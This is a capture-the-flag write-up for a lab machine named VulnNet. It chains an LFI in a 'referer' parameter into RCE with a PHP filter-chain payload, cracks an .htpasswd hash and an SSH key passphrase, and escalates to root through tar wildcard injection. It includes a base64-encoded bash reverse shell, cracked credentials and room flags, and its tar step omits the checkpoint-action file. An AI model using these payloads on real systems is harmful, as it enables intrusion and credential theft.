---
layout: default
title: VulnNet
---

## TL;DR

In this challenge we exploit `LFI` to `RCE` inisde `referer` http get parameter.

Then, we find the private key of `server-management` inside readable backup, and lastly we privleges escalete to root using `*` used inside `tar` being execueted as `root`.

### Recon

we start with `rustscan`, using this command:
```bash
rustscan -a $target -- -sV -sC -oN nmap.txt -oX nmap.xml
```

![rustscan results](image.png)

we can see port `22` with ssh and port `80` with apache http server
```bash
PORT   STATE SERVICE REASON         VERSION                                                                                                                  
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                             
| ssh-hostkey:                                                                                                                                               
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)                                                                                               
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxm
tI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUk
odIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41                                                                                         
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)                                                                                              
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1
aTKk=                                                                                                                                                        
|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)                                                                                            
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw                                                                           
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))                                                                                           
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                 
|_http-title: VulnNet                                                                                                                                        
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added `vulnnet.thm` to my `/etc/hosts`.

### LFI to RCE using php filter chain on http GET parameter

First, we visit the main page:

![main page](image-2.png)

After some navigation, I found `http://vulnnet.thm/js/index__d8338055.js`, this URL:
```bash
http://vulnnet.thm/index.php?referer=
```

![find inside js](image-1.png)

It smells like `LFI`, I tried my luck:
```bash
http://vulnnet.thm/index.php?referer=/etc/passwd
```

![/etc/passwd](image-3.png)

It worked!
We got `/etc/passwd`:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

Using [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) we can achieve `RCE`:
```bash
┌──(agonen㉿kali)-[~/thm/VulnNet/php_filter_chain_generator]
└─$ python php_filter_chain_generator.py --chain '<?php echo `$_GET[0]` ?>'
[+] The following gadget chain will generate the following code : <?php echo `$_GET[0]` ?> (base64 value: PD9waHAgZWNobyBgJF9HRVRbMF1gID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

![php filter chain](image-4.png)

We can simply paste this payload in the referer, plus the command `&0=id`.

![id](image-5.png)

However, this isn't the intended solution, so we'll go through the intended solution :)

Using `gobuster` I found another subdomain:
```bash
┌──(agonen㉿kali)-[~/thm/VulnNet]                                                                                                                
└─$ gobuster vhost -u 'http://vulnnet.thm/' --ad -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --xs 302                  
                                                                                                                                                 
===============================================================                                                                                  
Gobuster v3.8                                                                                                                                    
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                    
===============================================================                                                                                  
[+] Url:                       http://vulnnet.thm/                                                                                               
[+] Method:                    GET                                                                                                               
[+] Threads:                   10                                                                                                                
[+] Wordlist:                  /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt                                                
[+] User Agent:                gobuster/3.8                                                                                                      
[+] Timeout:                   10s                                      
[+] Append Domain:             true                                     
[+] Exclude Hostname Length:   false                                    
===============================================================                                                                                  
Starting gobuster in VHOST enumeration mode                                                                                                      
===============================================================                                                                                  
gc._msdcs.vulnnet.thm Status: 400 [Size: 424]                                                                                                    
broadcast.vulnnet.thm Status: 401 [Size: 468]                                                                                                    
#www.vulnnet.thm Status: 400 [Size: 303]                                                                                                         
#mail.vulnnet.thm Status: 400 [Size: 303]                                                                                                        
_domainkey.vulnnet.thm Status: 400 [Size: 424]                                                                                                   
Progress: 19966 / 19966 (100.00%)                                       
===============================================================                                                                                  
Finished                                                                
===============================================================
```

I added `broadcast.vulnnet.thm` to my `/etc/hosts`, we can see it returns 401, so this is basic auth page.

![401 page](image-6.png)

I now the credentials will be inside `.htpasswd`, I took common locations using chatGPT:
```bash
/etc/apache2/.htpasswd
/etc/apache2/conf/.htpasswd
/etc/apache2/auth/.htpasswd
/etc/apache2/sites-available/.htpasswd
/etc/apache2/sites-enabled/.htpasswd
/var/www/.htpasswd
/var/www/html/.htpasswd
/var/www/html/admin/.htpasswd
/var/www/html/private/.htpasswd
/var/www/html/secure/.htpasswd
/var/www/html/assets/.htpasswd
/var/www/html/includes/.htpasswd
/var/www/vulnnet/.htpasswd
/var/www/vulnnet.thm/.htpasswd
/var/www/public_html/.htpasswd
/home/www-data/.htpasswd
/home/vulnnet/.htpasswd
/srv/www/.htpasswd
/usr/share/apache2/.htpasswd
/usr/local/apache2/.htpasswd
/usr/local/apache2/conf/.htpasswd
.htpasswd
.htpasswd.bak
.htpasswd.old
.htpasswd~
.htpasswd.save
.htpasswd.orig
```

and used burp intruder:

![find](image-7.png)

So, we can find the credentials here `http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd`.
This is what we get:
```bash
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

I used `john` to crack the hash:
```bash
┌──(agonen㉿kali)-[~/thm/VulnNet]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (?)     
1g 0:00:00:22 DONE (2025-12-28 01:28) 0.04526g/s 97833p/s 97833c/s 97833C/s 99820111..9968743
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![john](image-8.png)

So, the credentials are:
```bash
developers:9972761drmfsls
```

After login, we can see this clipbucket page:

![clipbucket](image-9.png)

I tried to login with same credentials, not working.
However, We have arbirary un authenticated file upload using [https://www.exploit-db.com/exploits/44250](https://www.exploit-db.com/exploits/44250), which can lead to `RCE`.
This is the intended path, anyway, I'll keep with the php filter chain.

I pasted the payload from penelope:
```bash
printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xNjQuMjQ4LzQ0NDQgMD4mMSkgJg==|base64 -d|bash
```
and got my reverse shell

![rev shell](image-10.png)

### Find ssh private key of server-management inside readable backup

Inside crontab, we can find the cronjob that executes `/var/opt/backupsrv.sh`
```bash
www-data@vulnnet:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Then, I read `/var/opt/backupsrv.sh`:
```bash
www-data@vulnnet:/tmp$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

It simply backup files to `/var/backups`:
```bash
www-data@vulnnet:/tmp$ ls -la /var/backups
total 2400
drwxr-xr-x  2 root              root                 4096 Dec 28 00:00 .
drwxr-xr-x 14 root              root                 4096 Jan 23  2021 ..
-rw-r--r--  1 root              root                51200 Jan 23  2021 alternatives.tar.0
-rw-r--r--  1 root              root                13896 Jan 23  2021 apt.extended_states.0
-rw-r--r--  1 root              root                   11 Jan 23  2021 dpkg.arch.0
-rw-r--r--  1 root              root                   43 Jan 23  2021 dpkg.arch.1.gz
-rw-r--r--  1 root              root                   43 Jan 23  2021 dpkg.arch.2.gz
-rw-r--r--  1 root              root                  280 Jan 23  2021 dpkg.diversions.0
-rw-r--r--  1 root              root                  160 Jan 23  2021 dpkg.diversions.1.gz
-rw-r--r--  1 root              root                  160 Jan 23  2021 dpkg.diversions.2.gz
-rw-r--r--  1 root              root                  265 Jan 23  2021 dpkg.statoverride.0
-rw-r--r--  1 root              root                  195 Jan 23  2021 dpkg.statoverride.1.gz
-rw-r--r--  1 root              root                  179 Jan 23  2021 dpkg.statoverride.2.gz
-rw-r--r--  1 root              root              1402383 Jan 25  2021 dpkg.status.0
-rw-r--r--  1 root              root               386206 Jan 23  2021 dpkg.status.1.gz
-rw-r--r--  1 root              root               366251 Jan 23  2021 dpkg.status.2.gz
-rw-------  1 root              root                  857 Jan 23  2021 group.bak
-rw-------  1 root              shadow                712 Jan 23  2021 gshadow.bak
-rw-------  1 root              root                 1831 Jan 23  2021 passwd.bak
-rw-------  1 root              shadow               1118 Jan 23  2021 shadow.bak
-rw-rw-r--  1 server-management server-management    1484 Jan 24  2021 ssh-backup.tar.gz
-rw-r--r--  1 root              root                49338 Jan 25  2021 vulnnet-Monday.tgz
-rw-r--r--  1 root              root                49338 Dec 27 23:58 vulnnet-Saturday.tgz
-rw-r--r--  1 root              root                49338 Dec 28 00:56 vulnnet-Sunday.tgz
```
The file `ssh-backup.tar.gz` is very interesting:

![ls -la](image-11.png)

I copy it to `/tmp` and extracted:
```bash
www-data@vulnnet:/tmp$ cp /var/backups/ssh-backup.tar.gz /tmp/.
www-data@vulnnet:/tmp$ tar -xvf /tmp/ssh-backup.tar.gz 
id_rsa
```

Okay, we got `id_rsa`:
```bash
www-data@vulnnet:/tmp$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----
```

We can see this is encrypted, let's downloaed, crack it using `ssh2john` and `john`, and use it to login as `server-management`
```bash
┌──(agonen㉿kali)-[~/thm/VulnNet]
└─$ ssh2john id_rsa > hash.txt  
                                                                                                                                                 
┌──(agonen㉿kali)-[~/thm/VulnNet]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
oneTWO3gOyac     (id_rsa)     
1g 0:00:00:05 DONE (2025-12-28 02:00) 0.1941g/s 952888p/s 952888c/s 952888C/s one_1981..oneEighty2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![crack](image-12.png)

Now, we can login via ssh:
```bash
┌──(agonen㉿kali)-[~/thm/VulnNet]
└─$ ssh server-management@vulnnet.thm -i id_rsa              
Enter passphrase for key 'id_rsa':  # oneTWO3gOyac
```

![login](image-13.png)

we can grab the user flag:
```bash
server-management@vulnnet:~$ cat user.txt 
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

### Privilege Escalation to Root using * on tar being executed as root

Remember the cronjob task that is being executed as root:
```bash
# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files
```

It uses `*` on a folder we control, and then pass it to `tar`. based on [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/), we can get privilege esacaltion
> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

we can create two files that will be the flags:
```bash
server-management@vulnnet:~$ cd /home/server-management/Documents
server-management@vulnnet:~/Documents$ touch './--checkpoint=1'
server-management@vulnnet:~/Documents$ echo -e 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xNjQuMjQ4LzQ0NDQgMD4mMSkgJg==|base64 -d|bash' > rev_shell.sh
server-management@vulnnet:~/Documents$ chmod +x rev_shell.sh
```

now, just wait for the reverse shell to come

![rev shell root](image-14.png)

and grab the root flag:

![root flag](image-15.png)

```bash
root@vulnnet:~# cat root.txt 
THM{220b671dd8adc301b34c2738ee8295ba}
```